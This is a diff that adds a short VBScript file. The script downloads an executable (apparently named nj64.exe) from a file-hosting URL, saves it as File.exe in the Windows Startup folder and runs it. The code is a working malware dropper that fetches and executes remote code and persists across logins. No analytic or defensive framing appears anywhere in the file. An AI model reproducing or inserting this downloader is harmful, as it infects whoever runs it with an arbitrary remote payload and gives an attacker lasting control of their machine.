@@ -1,0 +1,14 @@
+Set objShell = CreateObject("WScript.Shell")
+Set args = WScript.Arguments
+ Url = "http://rghost.net/download/59694121/41aeecd6a96fd50f820ef93d12715b8f955dd26d/nj64.exe"
+dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
+dim bStrm: Set bStrm = createobject("Adodb.Stream")
+xHttp.Open "GET", Url, False
+xHttp.Send
+with bStrm
+.type = 1
+.open
+.write xHttp.responseBody
+.savetofile objShell.SpecialFolders("Startup") & "\" & "File.exe", 2
+objShell.Exec objShell.SpecialFolders("Startup") & "\" & "File.exe"
+end with
